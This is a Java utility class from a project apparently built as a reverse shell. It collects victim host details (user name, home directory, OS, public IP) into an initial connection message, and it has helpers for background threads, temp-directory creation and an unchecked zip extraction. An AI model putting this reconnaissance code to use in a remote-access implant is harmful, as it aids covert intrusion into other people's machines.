package com.mtattab.reverseshell.util;

import com.mtattab.reverseshell.model.InitialConnectionMessageModel;
import com.mtattab.reverseshell.model.PublicIpJsonModel;
import com.mtattab.reverseshell.model.ReverseShellInfoInitialMessage;
import lombok.experimental.UtilityClass;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Path;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

@UtilityClass
public class OSUtil {
    public static ReverseShellInfoInitialMessage getComputerInfo() {

        return ReverseShellInfoInitialMessage.builder()
                .userName(System.getProperty("user.name"))
                .userLanguage(System.getProperty("user.language"))
                .userCurrentWorkingDir(System.getProperty("user.dir"))
                .userHome(System.getProperty("user.home"))
                .osName(System.getProperty("os.name"))
                .osArch(System.getProperty("os.arch"))
                .osVersion(System.getProperty("os.version"))
                .userPublicIp(getPublicIp())
                .build();

    }

    public static String getSystemTmpDir(){

        return System.getProperty("java.io.tmpdir");
    }

    private static String getPublicIp() {
        try {
            URL url = new URL("https://httpbin.org/ip");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }

                // The response is a JSON object containing the public IP address
                // You may need to parse this JSON response depending on your needs
                // In this example, we assume a simple JSON format like {"origin": "xxx.xxx.xxx.xxx"}
                String json = response.toString();

                PublicIpJsonModel publicIpJsonModel = DataManipulationUtil.jsonToObject(
                        json, PublicIpJsonModel.class);

                if (publicIpJsonModel!= null && publicIpJsonModel.getOrigin() !=null){
                    connection.disconnect();

                    return publicIpJsonModel.getOrigin();
                }else {
                    connection.disconnect();

                    return response.toString();
                }

            } finally {
                connection.disconnect();
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    public static void createDirectories(String path) {
        File directory = new File(path);

        // Check if the directory doesn't exist
        if (!directory.exists()) {
            // Attempt to create the directory and its parent directories if necessary
            boolean success = directory.mkdirs();

            if (success) {
                System.out.println("Directories created: " + path);
            } else {
                System.out.println("Failed to create directories: " + path);
                throw new RuntimeException("Directory not created.");
            }
        } else {
            System.out.println("Directories already exist: " + path);
        }
    }

    public static void runFunctionInThread(Runnable myFunction) {
        // Create an ExecutorService with a single thread
        ExecutorService executorService = Executors.newSingleThreadExecutor();

        // Submit the Runnable to the executor service
        executorService.submit(myFunction);

        // Shutdown the executor service when done
        executorService.shutdown();
    }

    public static void sleep(long milliSeconds){
        try {
            Thread.sleep(milliSeconds);

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static Path unzip(String zipFilePath, String destDirectory) throws IOException {
        try (ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(zipFilePath))) {
            // Create the destination directory if it doesn't exist
            File destDir = new File(destDirectory);
            if (!destDir.exists()) {
                destDir.mkdirs();
            }

            // Counter for tracking the number of files in the ZIP archive
            int fileCount = 0;

            // Read entries from the ZIP file
            ZipEntry zipEntry;

            String entryPath="";
            while ((zipEntry = zipInputStream.getNextEntry()) != null) {
                // Increment the file count
                fileCount++;

                // Create the entry's destination file
                entryPath = destDirectory + File.separator + zipEntry.getName();
                File entryFile = new File(entryPath);

                // Create parent directories if they don't exist
                if (!entryFile.getParentFile().exists()) {
                    entryFile.getParentFile().mkdirs();
                }

                // Extract the entry
                try (FileOutputStream fileOutputStream = new FileOutputStream(entryFile)) {
                    byte[] buffer = new byte[1024];
                    int length;
                    while ((length = zipInputStream.read(buffer)) > 0) {
                        fileOutputStream.write(buffer, 0, length);
                    }
                }
            }

            // Check if there is exactly one file in the ZIP archive
            if (fileCount != 1) {
                throw new IOException("Expected one file in the ZIP archive, found: " + fileCount);
            }

            System.out.println("Unzip completed successfully.");
            return Path.of(entryPath);
        } catch (IOException e) {
            System.err.println("Failed to unzip the file: " + zipFilePath);
            throw e; // Rethrow the exception to indicate the failure
        }
    }

    public static File createDirectoryInTmpFolder(String dir){
        String powerShellDirectory = OSUtil.getSystemTmpDir()+ dir;
        OSUtil.createDirectories(powerShellDirectory);

        return new File(powerShellDirectory);

    }



}
